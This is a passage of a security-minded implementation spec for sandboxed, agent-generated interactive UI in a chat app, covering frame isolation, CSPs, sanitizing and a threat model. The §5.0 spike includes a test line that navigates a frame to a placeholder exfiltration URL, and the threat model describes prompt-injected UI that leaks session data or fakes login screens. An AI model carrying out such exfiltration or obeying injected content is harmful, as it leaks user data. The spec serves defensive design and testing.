# Interactive answers (inline UI) — implementation spec

> **Spec, revision 3.1, 2026-10-14.** Adds small interactive answers — charts,
> calculators, diagrams, comparisons with controls — rendered inside the web
> chat, next to the reply that produced them. The idea and some code come from
> [CopilotKit/OpenIntelligentUI](https://github.com/CopilotKit/OpenIntelligentUI)
> (MIT, © Atai Barkai), abbreviated **OIUI**. Its framework (CopilotKit,
> AG-UI, a Python LangGraph agent, the paid "Jev" visualization router) is
> **not** adopted. Four mechanisms are: a sandboxed per-answer frame, a
> validated bridge from the frame back to the chat, a streaming preview, and
> the authoring guidance that makes generated UI usable.
>
> **Review.** Revision 1 was reviewed against the code by four independent
> reviewers (security; code accuracy; product and model behaviour; tests,
> operations and house rules): 95 findings, 9 blockers. Revision 2 was
> reviewed by two (security; accuracy and consistency): 39 findings, 3
> blockers. Revision 3 was checked once more (1 blocker, 3 majors, 3 minors).
> Every verified finding is folded in; Appendix B lists what
> changed. Problems found outside this feature are in §13 and are not fixed
> here.
>
> **One assumption is unproven and gates the design:** that an outer frame's
> CSP `frame-src` stops an inner frame from navigating itself to a remote URL,
> on Chromium, Gecko and WebKit. P1 starts with a spike that proves or
> disproves it (§5.0); §3-D9 gives the design for both outcomes.
>
> Every statement about today's code carries a `file:line` reference against
> `main` at d2f9b65.
>
> **User-facing name:** "Interactive answer". **Code name:** `inline-ui`.

## Contents

- §1 What exists today
- §2 Goals and non-goals
- §3 Decisions
- §4 Security invariants and threat model
- §5 P1 — Spike, tool, storage, frames, history, evaluation
- §6 P2 — Suggested follow-ups
- §7 P3 — Save as live artifact
- §8 P4 — Streaming preview (conditional)
- §9 Guidance
- §10 Cross-cutting
- §11 Test plan
- §12 Delivery
- §13 Pre-existing issues found in review
- §14 Open questions
- Appendix A — What is taken from OIUI
- Appendix B — Revision log

---

## 1. What exists today

### 1.1 Rendering in the chat

| Fact | Evidence |
|---|---|
| Assistant text is markdown via `react-markdown` + `remark-gfm`, no raw HTML | `web/components/ui/markdown-renderer.tsx:68-235` |
| The timeline merges `message`, `agent`, `team`, `file_changes` entries by time; ordering and ids come from a shared module with an exhaustive kind map | `web/components/chat/message-timeline.tsx:827-831,850-931,968-988`; `src/shared/timeline-order.ts:23-35` |
| `MessageTimeline` is also used by rooms | `web/components/rooms/room-view.tsx:481` |
| Tool calls show only in a collapsed per-agent list; result rendering switches on `ToolResultPreview.kind` with no `default` | `message-timeline.tsx:369-447,463-502,504-593` |
| `ToolResultPreview` is a shared union; previews are capped at 2 000 chars; large payloads go "preview + ref, never the whole file through the event bus" | `src/shared/work-stream.ts:44-63,56-59,77` |
| A tool may attach UI-only data under `__workStream`; it is stripped before the model and the persisted row see the result | `src/shared/work-stream.ts:89-120`, `src/core/tool-executor.ts:1052-1056`, precedent `src/tools/filesystem/index.ts:378` |
| Auto-scroll depends only on message and tracked-agent counts | `message-timeline.tsx:938-942` |
| The live reply's sort time is clamped to `max(envelope time, question time + 1)` to absorb clock skew; agent-event handlers do not receive the envelope timestamp | `web/app/chat/page.tsx:774,1029-1036` |
| The web app is dark-only | `web/app/layout.tsx:35` |
| The TUI shows nothing for unknown preview kinds | `src/tui-pi/gateway-adapter.ts:513-545` |

There is no way today to show agent-generated interactive HTML in the chat.
The only interactive HTML surface is a live artifact, which needs a workspace,
an ASK approval (`src/tools/artifacts/index.ts:183-186`), a slug, and opens on
its own page.

### 1.2 Event flow for a turn

| Fact | Evidence |
|---|---|
| Server→client events are a TS union with `unknown` payloads; client→server frames are Zod-validated, non-strict (unknown keys stripped) | `src/core/gateway/protocol.ts:85-199,253,272-404,292` |
| Text streams as `chat.delta`, root only, when `agent.streaming !== false` and the provider streams | `src/core/agent-worker.ts:2374-2389`, `src/core/gateway/event-bridge.ts:76-90` |
| Providers yield partial tool-call JSON; `collectStream` assembles it server-side; only text reaches `onDelta`; the final `ToolCall.id` equals the assembly key; id-less streams key calls `call_<n>` | `src/models/stream-collect.ts:38-51,46,74-77` |
| The CLI provider does not stream | `src/models/providers/cli-provider.ts:713-714` |
| Tool start reaches clients with `argsSummary ≤ 120`; completion as `tool_call_complete {resultPreview ≤ 200, title, input, result}` | `tool-executor.ts:502-523,140-154,866-878` |
| A denied or blocked call pushes a result with no `tool_call_complete` | `tool-executor.ts:723-745` |
| An ASK stores the full arguments in `permission_requests.context.toolArguments`, served by REST and on reconnect | `src/security/permissions.ts:358-365`, `src/api/routes/permission-requests.ts:30`, `src/core/gateway/message-handler.ts:75`, call site `tool-executor.ts:757-762` |
| `agent_events` older than one day are deleted at boot | `src/index.ts:176-181` |
| Replay buffer: 200 events per session, 500 sessions, `UNRECORDED_TYPES` excluded | `src/core/gateway/event-bus.ts:25,28,52` |

### 1.3 History: what the model sees on later turns

| Fact | Evidence |
|---|---|
| Personal root sessions save a **native conversation snapshot** — every message including tool calls with arguments and tool results — and replay it on the next turn | write `src/core/agent-worker.ts:797-808`; read `:572-582`; `src/db/schema/sessions.ts:98` |
| For Anthropic and Gemini the assistant message is replayed from `providerRaw` (the provider's own blocks, tool inputs included), byte for byte; `providerRaw` is kept while the model is unchanged | `src/models/providers/custom/anthropic-compat-provider.ts:205,327-333`; `src/models/providers/gemini-provider.ts:168-169,291`; `src/models/providers/custom/gemini-compat-provider.ts:348`; `agent-worker.ts:582` |
| Rooms neither read nor write the snapshot | `agent-worker.ts:576-578` |
| Snapshot cap 256 000 chars, oldest dropped first | `src/core/session-history.ts:177-190` |
| The user message of a turn carries the root prompt's volatile part as `metadata.promptContext`; in the snapshot path the live message is built from it; on row rebuild, `promptContext` of any row is prepended for the model only | `agent-worker.ts:609-633`; `session-history.ts:159-165`; `src/db/schema/messages.ts:41` |
| A message sent during a running turn is a steer: content only, user row without metadata | `src/core/gateway/message-handler.ts:89-122,302-313` |
| Tool rows are stored truncated at 50 000 chars or spilled; they do not set `toolName` | `tool-executor.ts:1048-1099`, `src/utils/sanitize.ts:11` |
| `/clear` keeps rows (by `clearedAt`); delete removes them | `src/db/repositories/session-repository.ts:269-274,319` |

### 1.4 Sending a message from the web

| Fact | Evidence |
|---|---|
| `sendMessage` sends `chat.send`; it falls back to `POST /chat` (no `channel`) only when the gateway is down or the tab is over the tab limit | `web/app/chat/page.tsx:1559-1754,1670-1676,1684` |
| A turn's `channel` is a positional parameter of `handleMessage` and root-runner; `RunContext` is an ambient AsyncLocalStorage value created once per turn | `src/api/routes/chat.ts:181-187`, `message-handler.ts:410-415`, `src/core/agent/service.ts:275-276`, `src/core/agent/root-runner.ts:175`, `src/core/run-context.ts:21-45` |
| `attended` comes from the channel | `root-runner.ts:698`, `src/security/approval-policy.ts:69-74` |
| Composer draft lives inside `PromptInput` (`useState`), a React 19 function component | `web/components/chat/prompt-input.tsx:38,106`, `web/package.json:32` |

### 1.5 Isolation and egress controls already in place

| Fact | Evidence |
|---|---|
| Artifacts render in `<iframe sandbox="allow-scripts">` (opaque origin) | `web/app/artifacts/view/detail-client.tsx:147-151`, `src/api/routes/artifact-pages.ts:184` |
| Artifact embed CSP allows `img-src 'self' data: https:` and `connect-src 'self'` + gateway | `src/core/artifacts/csp.ts:16-35` |
| The SPA server sets no CSP; the API sets a strict CSP and `X-Frame-Options: DENY` except under `/a/`, `/__artifacts__/` | `web/serve.mjs:111-114`, `src/api/server.ts:161-176` |
| Tauri: `"csp": null`; app commands `get_backend_url`/`set_backend_url`; `build.rs` declares no `AppManifest`, so app commands are not governed by capabilities | `web/src-tauri/tauri.conf.json:23-25`, `web/src-tauri/src/lib.rs:34-47,57`, `web/src-tauri/build.rs` |
| Flow guard: labels `secret`/`private`/`suspicious`; any egress after `secret` and write egress after private+suspicious become ASK; web fetch is `read` egress; `getFlowLabel(sessionId)` is synchronous | `src/security/flow-guard.ts:101-169,128-129,180,480-491,524-541` |
| A call carrying `{{secret:NAME}}` is exempt from the flow guard; BaseTool substitutes placeholders unless `injectSecrets: false`; an entry with empty `allowedTools` serves every tool | `tool-executor.ts:710-711`, `flow-guard.ts:505-519`, `src/tools/base-tool.ts:220-224`, `src/security/vault.ts:663-666` |
| Session cookie `HttpOnly; SameSite=Strict`; the web also keeps a Bearer token in `localStorage` | `src/api/session-cookie.ts:27`, `web/lib/api.ts:146` |
| An admin can act as another user | `src/api/server.ts:295-330` |

### 1.6 Tool plumbing

| Fact | Evidence |
|---|---|
| `AgentContext` has `root` and `metadata`, no channel | `src/core/types.ts:48-118,91-101` |
| Session audience kinds `personal`, `group`, `space`, `room`, `remote-space`; `sessionAudience` is async; root-runner holds `session` | `src/core/agent/audience.ts:27,67-73`, `root-runner.ts:229` |
| Root tool set: role tools, plan/space/remote filters (`:312-342`), small-model cap (`:343-355`, `rootIsSmall` at `:349`), intent shrink, lazy split whose advertised ids are a `const` literal inside the lazy branch | `root-runner.ts:387-439,413` |
| `rootAllowedToolIds` only feeds what children may be granted | `root-runner.ts:250-253`, `src/core/swarm/spawner.ts:605,2500-2508` |
| Built-in tools register in `MODULES` (`AGENT.md:207-208` is stale) | `src/tools/discovery.ts:19-50,54-86` |
| Codemode scripts call `ToolHandler`s; handler flags live on `ToolHandler` | `src/tools/codemode.ts:84-92`, `src/core/agent-base.ts:73-107`, `base-tool.ts:78-101` |
| A missing required parameter is rejected before the body runs; truncated tool JSON is usually repaired | `base-tool.ts:110-117`, `src/models/tool-call-args.ts:24-35` |
| A length-truncated turn is retried only when it has no tool calls | `agent-worker.ts:1626-1645` |
| Root gets no skill discovery; precedent for long guidance is a tool action | `root-runner.ts:306-311`, `src/tools/artifacts-toolbox/index.ts:22,180-185` |
| Output cap defaults to 16 384 tokens, thinking included | `agent-worker.ts:2315`, `src/db/schema/models.ts:8`, `src/models/thinking-budget.ts:19-46` |
| Eval integration posts `/api/chat` with `channel` defaulting to `api`; `toolsUsed` is always `[]`; tool rows carry `sessionId` | `src/eval/runner.ts:75,180-182,239`, `chat.ts:169-176` |
| Web has no unit lane; Playwright stubs API and gateway; unmatched `/api` calls answer `200 {}`; a console watchdog fails on page errors | `vitest.config.ts:48`, `tests/web/fixtures/api-stubs.ts:68-74`, `tests/web/fixtures/auth.ts:76-78,143-153` |
| Migrations: hand-written SQL plus journal entry; journal ends at `0137_federation` | `src/db/migrations/meta/_journal.json`, `drizzle.config.ts` |

---

## 2. Goals and non-goals

**Goals**

- G1. In a personal web chat, the root agent can answer with a small
  interactive UI that appears with its reply, works, and survives reload.
- G2. Generated code can do nothing outside its frame except what a click in
  the parent app allows.
- G3. Server-side refusals reach the model as tool errors in the same turn;
  client-side failures are visible in the block and reach the model on the
  user's next message, as structured outcomes only.
- G4. A render's source costs once, not on every later turn.
- G5. A useful interactive answer can be kept as a live artifact.
- G6. Use is measured before the feature grows (eval gate after P1).

**Non-goals**

- No agent framework, no visualization router model.
- Not in TUI, channels, MCP, voice, rooms, spaces or group threads (§14).
- No data sources, refresh or sharing — live artifacts do that.
- No state that survives re-mounting a frame.
- No network from a frame, no CDN libraries.

---

## 3. Decisions

**D1. One tool group, `inline-ui`, three handlers.** All register with
`injectSecrets: false`.
- `inline-ui__render` — action `render`, ALLOW. Params
  `{ title, height_hint?, css?, html, js? }`; `height_hint` defaults to 320;
  `html` is checked in the body, not marked `required` (§5.2 truncation).
- `inline-ui__get` — action `read`, ALLOW, read-only. Source of a block **of
  the current session only**.
- `inline-ui__guide` — action `read`, ALLOW, read-only. Optional recipes. The
  essential contract is in the `render` description (§9.1).

**D2. Source stored in its own table, fetched by reference.** The tool result
carries a `ToolResultPreview` of kind `inline_ui` with the block id; the
browser fetches the source over REST. Keeps the event-bus rule (§1.1) and
makes reload independent of the one-day `agent_events` retention.

**D3. Timeline entry kind `inline_ui`, anchored to its turn.** Added to
`src/shared/timeline-order.ts` and the web `TimelineEntry`. Sort key: the
block's server `createdAt`, which lies inside its root agent's run and so
before the turn's final reply row (`service.ts:1099`). Live entries use the
gateway envelope timestamp, clamped like the reply
(`max(envelope, question + 1)`, `page.tsx:774`); `handleAgentEvent` gains the
envelope timestamp (`page.tsx:1029-1036`). `MessageTimeline` takes the
entries through an optional prop, so rooms are unaffected.

**D4. Offered when one predicate holds; the decision travels with the agent.**
root-runner computes `inlineUiOffered`:
- root agent;
- `(await sessionAudience(session)).kind === 'personal'`;
- the client declared `renders: ['inline_ui']` for this turn (D14);
- not small-tier;
- no stored DENY on tool `inline-ui` for the user (kill switch, §10.4);
- the root model is not a CLI provider (`isCLIProvider`,
  `src/core/cli-agent-factory.ts:9`): a vendor CLI keeps its own resumable
  transcript (`src/core/cli-compaction.ts:16-20`), which D12 cannot stub, and
  receives root tools through the MCP bridge (`src/core/cli-agent-worker.ts:241-276`).

It stores the result as `context.metadata.inlineUiOffered = true` on the root
`AgentContext`. `render` requires `context.root === true &&
context.metadata?.inlineUiOffered === true` plus a fresh stored-DENY check,
else `ToolNotExecutedError`. Children, rooms, spaces, group threads, remote
rooms and old clients never get the tool, whatever a role row lists.
Lite-tier models are offered it; the eval decides (§5.10).

**D5. Added by root-runner, not through a role.** A client capability, not a
role capability; customized `general` rows never receive new tools or prompt
lines (`src/db/seed-roles.ts:50-75`). After `rootIsSmall`
(`root-runner.ts:349`): if offered, append the handlers to `rootTools`; if not
offered, filter any `inline-ui` handlers a customized role row brought in. In
the lazy core-id literal (`:413`) add `...(inlineUi ? ['inline-ui'] : [])`.
Not added to `rootAllowedToolIds` (children). `'inline-ui'` joins
`PERSONAL_ONLY_TOOL_IDS` (`src/security/space-tools.ts:139`).

**D6. Two nested frames; generated content is data; only the inner frame ever
holds it.**

```
chat page ──iframe sandbox=allow-scripts srcdoc=HOST──▶ host frame (our code only)
                                                         CSP: script-src 'nonce-H'; frame-src <inner only>
                                                         └─iframe sandbox=allow-scripts──▶ content frame
                                                              CSP: script-src 'nonce-C'; no network
                                                              runtime (ours) + sanitized html + css [+ js]
```

- The **host frame** is a constant document built by the parent from
  constants only, plus the payload `{ mode, css, html, js, nonceC }` as a JSON
  literal in which every `<` is replaced by the JSON escape sequence for
  U+003C (backslash, `u`, `0`, `0`, `3`, `c`) and U+2028/U+2029 likewise. The
  host never inserts generated markup into its own document. It creates the
  content frame, observes it (load events, CSP violation events), relays its
  messages to the chat page after validation, and is the only frame the chat
  page listens to.
- The **content frame** is built by the host from a second constant document
  (its runtime) plus the same payload. The runtime, before anything generated
  enters the document, caches every DOM method and object it will use
  (`document.createElement`, `querySelectorAll`, `TreeWalker`, `postMessage`,
  `parent`, `JSON`, `Function.prototype` methods) and then:
  1. parses `html` with `template.innerHTML` (inert, scripts marked
     already-started, nothing loads), walks it with a `TreeWalker` including
     nested `template.content`, applies §4.3, and moves the result into
     `<body>`;
  2. sets a `<style>` element's `textContent` to `css`;
  3. in scripted mode, creates a `<script>` with nonce C and `textContent = js`.
- Parser breakouts (`</style>` in css, `</script>` or `<!--` in js,
  `<plaintext>`/`<textarea>`/`<title>` in html) cannot occur: no generated
  text is ever concatenated into markup. The browser's parser is the
  sanitizer's parser; no parser dependency is added.
- Generated code shares a realm only with the content runtime, never with the
  host. So it can forge or suppress content-frame messages, but not host
  signals: navigation stops, CSP violations and flood detection are observed
  by the host from outside.
- Two modes: **static** (no `js`; no generated code ever runs) and
  **scripted**.

**D7. No network from a frame.** Both CSPs deny every fetch and every remote
image, font, stylesheet, script, frame and worker. OIUI allows four CDNs and
`'unsafe-eval'`; that would let generated code send anything anywhere and
pull arbitrary code. Charts are SVG or canvas written by the model.

**D8. Nothing leaves the chat page without a click in the chat page.**
- Links: no live `href` ever exists in the content frame (§4.3); the runtime
  turns link activation into a `link` message; the chat page shows the URL in
  a chip with a real link (P1).
- Follow-ups (P2): the frame suggests a message; the chat page draws a
  suggestion strip outside the frame, with `[Send] [Edit in composer]
  [Dismiss]`. Send is a click in the chat page.

OIUI sends and opens directly. We diverge because generated code is model
output that untrusted content can steer, and a sent message counts as the
user's own words and can steer a running turn (§1.3).

**D9. Self-navigation: contained by the host frame, or treated as write egress.**
A scripted content frame can try to navigate itself to a URL carrying data
(a 204 response commits nothing, so it can repeat; a 200 response puts a
remote page with full network inside the chat area). Revision 2 claimed no
CSP directive governs this; that was wrong: the embedder's `frame-src` is
checked on navigations of its child frames in Chromium and Gecko.

- **If the spike (§5.0) shows the host's `frame-src` blocks the content
  frame's navigation to any `http(s):` URL on Chromium, Gecko and WebKit:**
  a scripted render has **no egress**. The block is stopped when the host
  observes a violation in its own realm or a content-frame `load` after the
  first; events in the content realm are never relied on (generated code
  lives there). If an engine offers neither signal, navigation is still
  blocked and the block shows no stop reason.
- **Otherwise:** a scripted render is **`write` egress** in `classifyFlow`
  (a browser GET can carry any data to any host — write-like; this also
  covers private+suspicious, `flow-guard.ts:486`), every scripted block is
  click-to-run (D10), and the host stops the block on any content-frame
  `load` after the first.

In both cases: `isVaultAuthenticated` returns false for `toolId ===
'inline-ui'`, and `render` refuses any `{{secret:` placeholder. A static
render has no egress: no live link, no script, no pragma (§4.3).

**D10. Click-to-run.** A scripted block mounts with its html and css shown and
a chat-page-drawn "Run interactive answer" button, instead of running, when
any holds:
- loaded from history (a block that hangs the tab would otherwise hang the
  session on every reload, T6);
- rendered while the session label had `suspicious`, `private` or `secret`
  (stored as `tainted`);
- the viewer is impersonating;
- the freeze marker for the block survived (§5.6);
- the D9 fallback applies.

A static block runs no generated code, but it can still hang rendering
through CSS/SVG (T6); it follows the freeze marker rule and the §4.4 caps.

**D11. Shared, pure helpers in `src/shared/inline-ui/`.** Host and content
document builders, CSP strings, runtime sources, the string lint, the
partial-JSON extractor, the bridge validator, limits, theme tokens. No
runtime imports; browser APIs only through `globalThis` (`web/tsconfig.json`
compiles shared files without Node types). The esbuild syntax check is
server-only, in `src/tools/inline-ui/syntax.ts`.

**D12. At turn end, render sources leave history.** When the snapshot is
written (`agent-worker.ts:797-808`), for every message in `this.messages`:
- an `inline-ui__render` call that succeeded: arguments become
  `{ "id": "<uuid>", "stored": true }`;
- one that failed: arguments become `{ "stored": false, "error": "<code>" }`;
- an `inline-ui__get` tool result becomes `{ "id": "<uuid>", "fetched": true }`;
- and the `providerRaw` of each such assistant message is dropped, because
  Anthropic and Gemini replay tool inputs from it (§1.3). Prior-turn
  signatures are not needed for replay; dropping `providerRaw` is a state
  replay already supports (`agent-worker.ts:582`).

Stubbed messages carry a marker so the Gemini replay warning
(`src/models/providers/gemini-provider.ts:175`) is not logged for them on
every later turn. The stub is applied to the mapped copy before
`capNativeSnapshot`. Within the turn nothing is edited: the current tool-use cycle and its signed
blocks stay intact, and a failed render keeps its arguments so the model can
fix them. When the snapshot is not usable, the final assistant row's
`metadata.promptContext` carries `(system note: interactive answers shown in
this reply: <uuid>, <uuid>)` — ids only; titles are model-controlled text.

**D13. A tool call, not a fenced block in the reply.** The alternative — the
model writes the UI as a fenced block in its text, which would stream for
free over `chat.delta` — was considered and rejected for this spec:
- a tool call returns validation errors to the model in the same turn (G3);
- per-call permissions, stored DENY, flow guard and approval apply to calls;
- `chat.delta` reaches every client of the session including the TUI, and
  final text reaches channels; raw markup would need stripping everywhere.

It stays §14-Q1 because it would stream on providers that deliver tool
arguments in one chunk.

**D14. Clients declare what they can render.** `chat.send` gains an optional
`renders: ['inline_ui']` (Zod). `AgentService.handleMessage` (positional,
`service.ts:222-235`) gains one trailing option
`inlineUi?: { renders, reports, provenance }`; `renders` set into `RunContext.renders` (new readonly field,
`run-context.ts:21-30`) in the `runWithContext` call (`service.ts:276`);
root-runner and the tool read `getRunContext()?.renders`. The web declares it
over the gateway only. The REST fallback declares nothing: it runs when the
tab cannot hear the gateway (§1.4), so the block would not appear live, and
making that turn attended would publish approvals nobody can hear. Old tabs,
TUI, channels, MCP and eval runs that do not opt in are never offered the
tool.

**D15. Promotion uses the tool's version writer, moved to core, and a strict
artifact network policy.** `writeVersion` (`src/tools/artifacts/index.ts:67-112`)
moves to `src/core/artifacts/` in a refactor PR. Promoted artifacts get a
`network = 'none'` flag that makes `buildEmbedCsp` emit `img-src data: blob:;
connect-src 'none'`. P3 depends on fixing §13-1 first.

---

## 4. Security invariants and threat model

### 4.1 Invariants

| # | Invariant | Mechanism |
|---|---|---|
| S1 | Generated code never runs with the app's origin, cookies or storage | Both frames `sandbox="allow-scripts"` without `allow-same-origin` → opaque origins; `srcdoc` |
| S2 | No fetch; no remote script, style, font, image, media, frame or worker | §4.2 CSPs, first element of each `<head>`, in constant documents (D6) |
| S3 | No popups, forms, top or sibling navigation, modals, downloads, device features | Sandbox flags (only `allow-scripts`); `allow` denies every policy-controlled feature whose default allowlist is not `'none'` (§4.2); runtime strips `autofocus` |
| S4 | Static mode cannot navigate; scripted navigation is blocked (D9 spike) or stops the block (fallback) | No live `href` (§4.3); pragmas stripped; DNS prefetch off; host `frame-src`; host observes the content frame |
| S5 | The chat page acts only on host-frame messages of known shape and rate | `event.source === hostIframe.contentWindow`; the host accepts only `event.source === contentIframe.contentWindow`; per-mount correlation id (readable by generated code — not a secret); validator `src/shared/inline-ui/bridge.ts`; §4.4 rates; > 20 invalid or over-limit messages per second → unmount |
| S6 | Nothing is sent or opened without a click in the chat page | D8. Strip and chip buttons ignore input for 800 ms after they appear or move; the frame's height is locked while a strip is open; the strip sits at a fixed place below the frame. `navigator.userActivation` is **not** relied on: activation propagates from any frame to its ancestors, so it only proves "a recent click somewhere". Suggestion text is cleaned of C0/C1, bidi (U+202A–202E, U+2066–2069) and zero-width (U+200B–200F) characters |
| S7 | Refused markup is reported to the model (lint) and removed by the runtime (boundary, with CSP) | §4.3 |
| S8 | Only the session owner reads a block | `scopedRepos(principal).sessions.findById(sessionId)` then `getInSession(blockId, sessionId)`; 404 otherwise; `cache-control: no-store` |
| S9 | Sizes and rates are bounded | §4.4 |
| S10 | Flow guard sees what a scripted render can do | D9 |
| S11 | Vault secrets never enter a block | `injectSecrets: false`; `{{secret:` refused; no vault exemption |
| S12 | A frame cannot impersonate the app | Chat-page-drawn border and header; footer "Made by the agent · don't enter passwords or keys here"; height ≤ min(2 000 px, 80 vh); a chat-page spacer between the last block and the composer/permission banner; password and file inputs refused and stripped; `-webkit-text-security` refused |
| S13 | Desktop IPC is unreachable from either frame | `build.rs` declares `AppManifest::new().commands(&["get_backend_url","set_backend_url"])` with permissions granted only to the main window; the command handlers check the IPC origin; a desktop test calls `set_backend_url` from a scripted content frame on WebKitGTK, WKWebView and WebView2 and expects refusal |
| S14 | Focus cannot be stolen while the user types | The chat page detects focus moving into a frame without a preceding pointerdown or Tab, returns focus to where it was and stops the block — the one case where the chat page moves focus on its own |

### 4.2 Frame policies

Host frame CSP (`H` = per-mount nonce from `crypto.getRandomValues`):

```
default-src 'none'; script-src 'nonce-H' 'nonce-C'; style-src 'unsafe-inline';
img-src data: blob:; font-src data:; media-src data: blob:;
frame-src <spike result>; connect-src 'none'; form-action 'none'; base-uri 'none'
```

**Inheritance rule.** A `srcdoc` document copies its creator's policy
container, and a `blob:` document gets the policy container of the context
that made the blob. So the host CSP is also enforced inside the content
frame, on top of the content frame's own meta CSP. **The host CSP must
therefore allow everything the content CSP allows** (nonce C, `data:`/`blob:`
images and media, `data:` fonts). This is safe because the host never inserts
generated markup. A unit test checks that the content CSP's allowances are a
subset of the host CSP's. The alternative, a `data:` URL content frame
(empty policy container, `frame-src data:`), is evaluated in the spike.

Content frame CSP (`C` = second per-mount nonce):

```
default-src 'none'; script-src 'nonce-C'; style-src 'unsafe-inline';
img-src data: blob:; font-src data:; media-src data: blob:;
connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none';
manifest-src 'none'; form-action 'none'; base-uri 'none'
```

Inline event-handler attributes and `javascript:` URLs cannot run (no
`'unsafe-inline'`, no `'unsafe-hashes'`); the guide tells the model to use
`addEventListener`. No `'unsafe-eval'`. Generated js, once running, can read
nonce C; that grants nothing it does not already have.

Head order in both: CSP · `<meta name="referrer" content="no-referrer">` ·
`<meta http-equiv="x-dns-prefetch-control" content="off">` · charset ·
`color-scheme: dark` · `<style>` · runtime `<script nonce>`.

Both iframes: `sandbox="allow-scripts"`, `referrerpolicy="no-referrer"`,
`title`, and an `allow` attribute generated from a list in
`src/shared/inline-ui/permissions-policy.ts` that sets `'none'` for every
policy-controlled feature with a non-`'none'` default (including
`attribution-reporting`, `browsing-topics`, `clipboard-write`,
`join-ad-interest-group`, `local-fonts`, `picture-in-picture`,
`private-state-token-*`, `run-ad-auction`, `shared-storage*`,
`storage-access`, `sync-xhr`, `window-management`, and all device features).
A test reads `document.featurePolicy.allowedFeatures()` inside the content
frame where supported and expects it empty.

A `srcdoc` document snapshots its parent's policy container when created. The
SPA sets no CSP today; a future SPA or desktop CSP without nonce support
would break the frames. A test pins the SPA headers (§11).

### 4.3 Refusals (S7)

The server lint gives the model a specific error. The content runtime
enforces the same rules on the parsed DOM, so a lint bypass gains nothing.

| Field | Refused (case-insensitive) | Runtime action |
|---|---|---|
| `html` elements | `script`, `meta`, `link`, `base`, `iframe`, `frame`, `frameset`, `object`, `embed`, `portal`, `form`, `noscript`, `template`, `slot`; SVG `set`; SVG `animate*` whose `attributeName` is `href`, `xlink:href` or `src` | removed |
| `html` attributes | `on*`, `ping`, `attributionsrc`, `autofocus`, `formaction`, `action`, `shadowrootmode`, `name` on `img` | removed |
| `html` links | `href` on `a`/`area` that is not `https:` or `#…` | `https:` hrefs moved to `data-octi-href`, element gets `role="link"`, `tabindex="0"`; activation (click, Enter, Space) → `link` message, `preventDefault` first. No live `href` remains, so no preconnect, middle-click, context-menu open or drag-out |
| other URL attributes | `href`/`xlink:href` other than `#…` on SVG `use`; any SVG `a` href; MathML `href`; `src`/`srcset`/`poster`/`background` not `data:`/`blob:` | removed |
| `html` inputs | `type=password`, `type=file`, `autocomplete` containing `password` | replaced by a notice |
| `css` | `@import`; `url(`/`image-set(` other than `#…` or `data:`; `text-security` | left to CSP (blocked); `text-security` stripped by rewriting the declaration |
| render cost | more than 200 `<use>` elements, `<use>` nesting deeper than 3, more than 20 `filter`/`backdrop-filter` uses | removed beyond the cap |
| `js` | syntax errors (esbuild `transform`, server only) | n/a |
| any field | `{{secret:` | n/a |

The runtime walks with `composedPath()` for link activation and never uses
`setHTMLUnsafe`/`parseHTMLUnsafe` (declarative shadow roots would escape the
walk).

### 4.4 Limits (S9)

Constants in `src/shared/inline-ui/limits.ts` (not admin config: the client
enforces them too).

| What | Limit | Reason |
|---|---|---|
| `title` | ≤ 80 chars, single line, no controls | header |
| `html` / `css` / `js` | ≤ 24 000 / 6 000 / 12 000 chars | — |
| total | ≤ 36 000 chars, and `JSON.stringify({css,html,js}).length ≤ 48 000` | ≈ 10 k output tokens; a `get` result stays under the 50 000-char tool-result cap |
| renders per turn | 4 | counted by `(session_id, run_id)` |
| blocks per session | 200 | storage |
| height | 40 px … min(2 000 px, 80 vh) | S12 |
| `height` messages | one per animation frame | — |
| `error` messages | 20 per mount | — |
| `prompt` / `link` | 1 per 500 ms per frame; `prompt` text ≤ 1 000 chars | S6 |
| invalid messages | > 20 per second → unmount | S5 |
| `inlineUiReports` per send | ≤ 20 | — |

### 4.5 Threat model

| # | Threat | Outcome |
|---|---|---|
| T1 | Injected content asks for a UI that sends session data out | No session access (S1); no fetch (S2); navigation blocked by the host (spike) or ASK as write egress plus click-to-run (fallback) (D9) |
| T2 | Vault secret placed in markup | Refused (S11) |
| T3 | Parser breakout | Impossible: content is data (D6) |
| T4 | Exfiltration without script (meta refresh, prefetch, preconnect, CSS, SMIL href) | Pragmas stripped, no live hrefs, SMIL href refused, CSP blocks CSS URLs |
| T5 | Fake login or fake app UI | S12; click-to-run when tainted (D10) |
| T6 | Tab hang or memory bomb (opaque-origin frames may share the chat page's process in Firefox, WebKit and WebView2) | History blocks click-to-run; render-cost caps; freeze marker (§5.6); flood unmount |
| T7 | Steering the user's next message | Strip outside the frame, full text, explicit Send, input delay, height lock (S6) |
| T8 | Cross-session or cross-user read | S8; `get` limited to the session |
| T9 | Admin impersonation runs the target's code | Click-to-run and bridge disabled (D10) |
| T10 | Desktop IPC | S13 |
| T11 | Preview leaks before validation or approval | §8: static content frame; forwarded only for offered handlers and while the label has no `secret`, re-checked on every emit |
| T12 | Promotion opens network access to viewers | D15 strict network policy; tainted blocks refused |
| T13 | Generated text reaches the model as the user's words | Client reports are structured (outcome enum, error class, line); no free text from generated code reaches the model; ids only, never titles, in model-facing notes |
| T14 | Focus theft | S14 |
| T15 | Pastejacking via `execCommand('copy')` | `clipboard-write 'none'`; tested per engine; documented if an engine still allows it |

---

## 5. P1 — Spike, tool, storage, frames, history, evaluation

### 5.0 Spike (first, before the rest of P1)

A throwaway Playwright test page with the two-frame structure, on Chromium,
Firefox and WebKit (and a manual run in the three desktop webviews):

1. Content frame does `location = 'https://exfil.test/?d=1'` (routed and
   fulfilled with 200, with 204, and with a slow never-finishing body).
   Expect: no request reaches the route; a `securitypolicyviolation` reaches
   the host.
2. Same via a user click on a link the runtime did not strip (test-only).
3. Does `frame-src 'none'` permit the `srcdoc` content frame, or is `blob:`
   needed?
4. `navigator.userActivation`, `document.featurePolicy`, and
   `execCommand('copy')` behaviour per engine.
5. Inheritance: inside the content frame, the nonce-C runtime runs and
   `data:` image, `data:` font and `blob:` image load with no violation
   (§4.2 inheritance rule); compare `srcdoc`, `blob:` and `data:` content
   frames.
6. Which realm gets the navigation violation. By CSP3 the initiator's
   policy is checked, and the content document carries the inherited host
   `frame-src` too, so the event may fire only in the content realm, where
   generated code lives. Record per engine whether the **host** observes a
   violation or a content `load` (Chromium commits an error page).

The result picks D9's branch and the host `frame-src` value and is recorded
in the P1 PR. If WebKit alone fails, the fallback branch applies everywhere
(one behaviour, not per-engine).

### 5.1 Table `inline_ui_blocks`

Schema `src/db/schema/inline-ui-blocks.ts`, exported from
`src/db/schema/index.ts`. Hand-written migration
